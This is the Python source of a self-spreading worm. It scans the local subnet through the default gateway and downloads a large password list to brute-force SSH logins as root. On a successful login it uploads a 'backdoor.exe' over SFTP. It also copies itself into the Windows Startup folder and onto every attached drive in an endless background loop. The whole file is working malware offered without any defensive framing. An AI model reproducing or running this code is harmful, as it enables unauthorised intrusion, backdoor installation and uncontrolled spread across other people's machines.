import nmap
import paramiko
import os
import socket
from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
import win32api
import netifaces
from threading import Thread

# ----- -----
import networking
import looter
import nmap
# ----- -----

# ------------------- Logging ----------------------- #
import coloredlogs, logging
logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)
# --------------------------------------------------- #


gws = netifaces.gateways()
gateway = gws['default'][netifaces.AF_INET][0]

def scan_hosts(port):
    """
    Scans all machines on the same network that
     have the specified port enabled 
    Returns:
        IP addresses of hosts
    """
    logger.debug(f"Scanning machines on the same network with port {port} open.")


    logger.debug("Gateway: " + gateway)

    port_scanner = nmap.PortScanner()
    port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')

    all_hosts = port_scanner.all_hosts()

    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts


def download_ssh_passwords(filename):
    logger.debug("Downloading passwords...")
    url = "https://raw.githubusercontent.com/Olegatopt/10_million_password_list_top_100000/main/10_million_password_list_top_100000.txt"
    urllib.request.urlretrieve(url, filename)
    logger.debug("Passwords downloaded!")


def connect_to_ftp(host, username, password):
    try:
        ftp = FTP(host)
        ftp.login(username, password)
    except ftplib.all_errors as error:
        logger.error(error)
        pass


def connect_to_ssh(host, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logger.debug("Connecting to: " + host)
        client.connect(host, 22, "root", password)
        logger.debug("Successfully connected!")

        sftp = client.open_sftp()
        sftp.put('backdoor.exe', "destination") # change this.

        return True
    except socket.error:
        logger.error("Computer is offline or port 22 is closed")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        logger.error("Wrong Password or Username")
        return False
    except paramiko.ssh_exception.SSHException:
        # socket is open, but not SSH service responded
        logger.error("No response from SSH server")
        return False


def bruteforce_ssh(host, wordlist):
    file = open(wordlist, "r")
    for line in file:
        connection = connect_to_ssh(host, line)
        print(connection)
        time.sleep(5)

def drivespreading():
    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        print(drives)
        for drive in drives:
            try:
                if "C:\\" == drive:
                    copy2(__file__, bootfolder)
                else:
                    copy2(__file__, drive)
            except:
                pass
        
        time.sleep(3)

def start_drive_spreading():
    # Starts "drivespreading" function as a threaded function. 
    # This means that the code will spread on drives and execute other functions at the same time.
    thread = Thread(target = drivespreading)
    thread.start()
    
def main():
    start_drive_spreading()


if __name__ == "__main__":
    main()
